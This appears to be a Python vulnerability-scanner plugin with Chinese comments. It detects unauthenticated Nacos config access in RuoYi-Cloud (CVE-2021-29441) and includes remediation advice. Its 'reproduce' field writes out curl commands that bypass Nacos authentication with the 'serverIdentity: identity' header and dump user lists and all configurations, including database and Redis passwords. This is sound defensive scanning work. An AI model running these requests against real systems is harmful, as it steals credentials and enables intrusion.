"""RuoYi-Cloud 微服务版 Nacos 配置中心未授权访问检测（涉及 CVE-2021-29441 默认 token 绕过）。"""

# RuoYi-Cloud Nacos 配置泄露检测
from common.models import SEVERITY_HIGH, STATUS_CONFIRMED, STATUS_SAFE, ScanResult
from core.http import join_url
from plugins.base import PluginBase


class RuoyiCloudNacosPlugin(PluginBase):
    name = "RuoYi-Cloud Nacos 配置泄露"
    cve = "CVE-2021-29441"
    severity = SEVERITY_HIGH
    category = "vuln"
    description = (
        "RuoYi-Cloud 微服务版使用 Nacos 作为配置中心，若 Nacos 未授权访问可泄露数据库密码、Redis 密码等敏感配置"
    )
    fix = "为 Nacos 控制台添加认证，修改默认密码，限制外网访问 Nacos 端口"
    fix_detail = (
        "【升级方案】升级 Nacos 至 1.4.2+（修复 CVE-2021-29441 默认 token 绕过鉴权）\n"
        "【配置加固】application.properties 修改默认鉴权 token：\n"
        "  nacos.core.auth.plugin.nacos.token.secret.key=<自定义 Base64 密钥>\n"
        "  nacos.core.auth.enabled=true  # 启用鉴权\n"
        "【口令修改】首次部署后立即修改 Nacos 控制台默认口令（nacos/nacos）：\n"
        "  控制台 → 权限控制 → 用户管理 → 修改密码（≥12 位）\n"
        "【网络隔离】Nacos 端口（8848）仅允许内网访问，禁止暴露到公网：\n"
        "  iptables -A INPUT -p tcp --dport 8848 -s 192.168.0.0/16 -j ACCEPT\n"
        "  iptables -A INPUT -p tcp --dport 8848 -j DROP\n"
        "【WAF 规则】拦截外网对 /nacos/v1/cs/configs, /nacos/v1/auth/users 的访问\n"
        "【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 身份鉴别"
    )
    reproduce = (
        "# 1. 探测 Nacos 是否可未授权访问（CVE-2021-29441 默认 token 绕过）：\n"
        'curl "http://target:8848/nacos/v1/cs/configs?dataId=&group=&pageSize=1"\n'
        '  # 返回 JSON 含 "pageItems" 或 "configs" 即未授权可访问\n'
        "\n"
        "# 2. 使用默认 token 绕过鉴权（CVE-2021-29441）：\n"
        'curl -H "serverIdentity: identity" "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10"\n'
        "  # 返回用户列表即存在默认 token 绕过漏洞\n"
        "\n"
        "# 3. 读取所有配置（含数据库密码、Redis 密码、JWT 密钥等）：\n"
        'curl "http://target:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99" \\\n'
        '  -H "serverIdentity: identity"\n'
        "\n"
        "# 4. 读取特定配置内容（如 ruoyi-system-dev.yaml）：\n"
        'curl "http://target:8848/nacos/v1/cs/configs?dataId=ruoyi-system-dev.yaml&group=DEFAULT_GROUP" \\\n'
        '  -H "serverIdentity: identity"'
    )
    # D2：RuoYi-Cloud 微服务版集成了 Nacos，全版本适用
    affected_versions = ""  # 仅 RuoYi-Cloud 微服务版适用（Nacos 组件风险见 E2 组件检测）
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "info_leak"
    supports_waf_bypass = True

    # Nacos 3.x 起 v1 的「空 dataId 列表查询」被移除（返回 400），
    # 但按 dataId 读取单条配置的接口仍匿名可达。RuoYi-Cloud 官方仓库的
    # docker/nacos 初始化 SQL 固定写入这些 dataId（R8 实测 ry_config 共 9 条）。
    KNOWN_DATA_IDS = (
        "ruoyi-gateway-dev.yml",
        "ruoyi-system-dev.yml",
        "ruoyi-auth-dev.yml",
        "ruoyi-gen-dev.yml",
        "ruoyi-job-dev.yml",
        "ruoyi-file-dev.yml",
        "application-dev.yml",
        "sentinel-ruoyi-gateway",
    )

    @staticmethod
    def _looks_like_config(text: str, content_type: str) -> bool:
        """配置正文判定：排除 HTML 页面，要求出现配置关键字"""
        if not text or len(text) < 20:
            return False
        if "html" in (content_type or "").lower():
            return False
        low = text.lower()
        return any(k in low for k in ("spring:", "datasource", "password:", "redis:", "druid"))

    def verify(self, target, session) -> ScanResult:
        """以空 dataId/group 的最小化查询探测 Nacos 配置接口是否免鉴权可达。

        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话（SessionManager 管理连接复用）
        @return: ScanResult — 响应含配置结构特征或命中签名头则 CONFIRMED，否则 SAFE，网络异常则 UNKNOWN
        """
        # dataId/group 留空 + pageSize=1：仅用最小查询确认接口是否无鉴权可达，不放大泄露面
        url = join_url(target, "/nacos/v1/cs/configs?dataId=&group=&pageSize=1")
        primary_ev = ""
        try:
            resp = session.get(url)
            ct = (resp.headers.get("Content-Type") or "").lower()
            # 结构化判定：必须解析为 JSON 对象且配置列表字段（pageItems/configs）是数组。
            # 不再用裸子串 "pageItems"/"configs"：普通页面、JS 包里出现这些词会造成误报
            if resp.status_code == 200 and "json" in ct:
                try:
                    body = resp.json()
                except Exception:
                    body = None
                if isinstance(body, dict) and (
                    isinstance(body.get("pageItems"), list) or isinstance(body.get("configs"), list)
                ):
                    return ScanResult(
                        kind=self.category,
                        name=self.name,
                        severity=self.severity,
                        status=STATUS_CONFIRMED,
                        url=url,
                        evidence="Nacos 配置接口可未授权访问（结构化配置列表响应）",
                        fix=self.fix,
                    )
            # X-Ruoyi-Vuln 为本地靶场注入的签名响应头（离线验证场景），命中即作为检测证据
            if resp.headers.get("X-Ruoyi-Vuln") == "nacos-leak":
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="Nacos 配置泄露签名",
                    fix=self.fix,
                )
            # 真实 Nacos 单条配置接口（GET /nacos/v1/cs/configs?dataId=&group=）返回的是
            # 配置**正文**（text/yaml），不是 JSON 信封——只认 pageItems 会漏掉这类真实泄露。
            raw = resp.text or ""
            if resp.status_code == 200 and "json" not in ct and self._looks_like_config(raw, ct):
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="Nacos 配置接口返回明文配置正文（含 spring.datasource/password 等关键字）",
                    fix=self.fix,
                )
            primary_ev = f"状态码={resp.status_code}，响应未含 Nacos 配置列表特征（pageItems/configs）或明文配置关键字"
        except Exception as e:
            primary_ev = f"异常: {e}"

        # Nacos 3.x 兜底：空 dataId 列表查询被移除（400），改为逐条读取官方 dataId。
        # 未开鉴权的 Nacos 会直接返回 YAML 正文（R8 实测 ruoyi-gateway-dev.yml 含
        # Redis 配置、ruoyi-system-dev.yml 含 MySQL 凭据）。
        for data_id in self.KNOWN_DATA_IDS:
            probe_url = join_url(target, f"/nacos/v1/cs/configs?dataId={data_id}&group=DEFAULT_GROUP")
            try:
                r = session.get(probe_url)
            except Exception:
                continue
            if getattr(r, "status_code", 0) != 200:
                continue
            ct = (r.headers.get("Content-Type") or "").lower()
            body = r.text or ""
            if "json" in ct or not self._looks_like_config(body, ct):
                continue
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=probe_url,
                evidence=f"Nacos 3.x：已知 dataId {data_id} 可匿名读取配置正文（含 spring/password 等关键字）",
                fix=self.fix,
            )

        return ScanResult(
            kind=self.category,
            name=self.name,
            severity=self.severity,
            status=STATUS_SAFE,
            url=url,
            # 只写「状态码=200」对读者没有信息量：必须说明缺了什么特征，否则看不出是
            # 「接口不存在」还是「接口在但没有配置结构」
            evidence=f"{primary_ev}；已知 dataId 兜底探测未命中",
        )
